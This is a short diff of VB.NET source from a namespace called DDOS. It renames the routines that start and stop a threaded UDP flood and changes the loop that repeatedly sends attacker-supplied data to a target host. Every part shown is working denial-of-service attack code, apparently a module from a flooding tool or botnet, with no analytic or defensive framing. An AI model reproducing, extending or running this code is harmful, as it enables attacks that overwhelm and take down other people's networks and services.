@@ -13,7 +13,7 @@ Namespace DDOS
         Public Threadsto As Integer
         Public DOSData As String
 
-        Public Sub Start()
+        Public Sub StartUDP()
             If Not AttackRunning = True Then
                 AttackRunning = True
                 Threads = New Thread(Threadsto - 1) {}
@@ -24,7 +24,7 @@ Namespace DDOS
                 Next
             End If
         End Sub
-        Public Sub Abort()
+        Public Sub StopUDP()
             If AttackRunning = True Then
                 For i As Integer = 0 To ThreadstoUse - 1
                     Try
@@ -53,8 +53,8 @@ Namespace DDOS
                     Dim data As String = DOSData
                     Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
                     Dim i As Int16
-                    For i = 0 To 30000
-                        bb = aa.Send(Host, 200, bt, cC)
+                    For i = 0 To 1000 Step 1
+                        bb = aa.Send(Host, 100, bt, cC)
                     Next i
                 Loop
             Catch ex As Exception
